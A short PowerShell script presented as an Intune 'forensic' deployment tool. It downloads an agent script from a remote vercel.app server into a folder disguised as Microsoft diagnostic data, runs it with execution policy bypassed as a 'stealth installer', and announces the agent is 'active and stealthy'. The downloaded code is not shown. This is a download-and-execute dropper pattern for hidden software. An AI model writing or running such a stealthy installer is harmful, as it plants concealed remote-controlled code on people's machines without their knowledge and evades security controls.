<#
    Intune v3.0 Deployment Script (Universal)
    Unified Manager Forensic Orchestration
#>

$ServerUrl = "https://unified-manager.vercel.app"
$InstallDir = "C:\ProgramData\Microsoft\DiagnosticData"
$ScriptPath = "$InstallDir\unified-agent.ps1"

if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }

Write-Host "Initiating Forensic v3.0 Deployment..." -ForegroundColor Cyan

# 1. Download Core v3.0 Agent
Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile $ScriptPath -UseBasicParsing -ErrorAction Stop

# 2. Run Stealth Installer
& powershell.exe -ExecutionPolicy Bypass -File $ScriptPath -Install -ServerUrl $ServerUrl

Write-Host "Forensic v3.0 Deployment Complete. Agent is now active and stealthy." -ForegroundColor Green
